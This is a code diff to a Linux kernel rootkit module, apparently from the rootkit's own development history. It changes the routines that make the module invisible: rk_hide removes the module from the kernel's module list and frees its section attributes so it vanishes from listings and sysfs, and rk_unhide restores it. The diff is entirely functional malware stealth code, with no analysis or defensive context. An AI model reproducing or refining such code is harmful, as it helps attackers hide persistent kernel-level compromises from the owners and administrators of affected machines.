@@ -6,6 +6,7 @@
 #include <linux/fs.h>
 #include <linux/init.h>
 #include <linux/cdev.h>
+#include <linux/slab.h>
 #include <linux/sched.h>
 #include <linux/delay.h>
 #include <linux/device.h>
@@ -42,8 +43,7 @@ unsigned int hidden = 0;
 pte_t *pte;
 
 
-static struct list_head *module_previous;
-static struct list_head *module_kobj_previous;
+static struct list_head *rk_mod;
 
 extern unsigned long __force_order;
 
@@ -167,13 +167,11 @@ void
 rk_hide(void)
 {
 	if (hidden) return;
-	
-	module_previous = THIS_MODULE->list.prev;
-	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
-	
+
+	rk_mod = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
-	kobject_del(&THIS_MODULE->mkobj.kobj);
-	list_del(&THIS_MODULE->mkobj.kobj.entry);
+	kfree(THIS_MODULE->sect_attrs);
+	THIS_MODULE->sect_attrs = NULL;
 
 	hidden = 1;
 }
@@ -181,13 +179,9 @@ rk_hide(void)
 void
 rk_unhide(void)
 {
-	int _;
 	if (!hidden) return;
-	
-	list_add(&THIS_MODULE->list, module_previous);
-	_ = kobject_add(&THIS_MODULE->mkobj.kobj,
-			THIS_MODULE->mkobj.kobj.parent, RK_NAME);
-	list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_previous);
+
+	list_add(&THIS_MODULE->list, rk_mod);
 
 	hidden = 0;
 }
